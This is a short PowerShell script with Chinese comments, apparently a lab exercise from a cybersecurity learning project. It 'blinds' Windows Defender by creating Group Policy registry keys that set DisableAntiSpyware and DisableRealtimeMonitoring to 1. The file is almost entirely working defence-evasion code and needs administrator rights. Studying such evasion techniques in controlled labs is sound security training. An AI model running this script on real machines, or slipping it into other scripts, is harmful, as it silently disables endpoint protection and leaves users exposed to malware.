# ==========================================================
# 实验项目: Road-to-CyberSecurity-Master (Test01)
# 脚本功能: 基于注册表策略(Registry Modification)的防御规避研究
# 注意事项: 仅用于受控实验环境，需以管理员权限运行
# ==========================================================

Write-Host "[*] 正在执行防御规避实验：致盲 Windows Defender..." -ForegroundColor Cyan

# 路径: 组策略控制下的 Windows Defender 注册表位置
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

# 1. 禁用反间谍软件模块 (核心致盲指令)
if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force
}
Set-ItemProperty -Path $registryPath -Name "DisableAntiSpyware" -Value 1

# 2. 禁用实时监控 (子项配置)
$realTimePath = "$registryPath\Real-Time Protection"
if (!(Test-Path $realTimePath)) {
    New-Item -Path $realTimePath -Force
}
Set-ItemProperty -Path $realTimePath -Name "DisableRealtimeMonitoring" -Value 1

Write-Host "[+] 注册表策略修改完成。请重启系统或检查 Defender 状态。" -ForegroundColor Green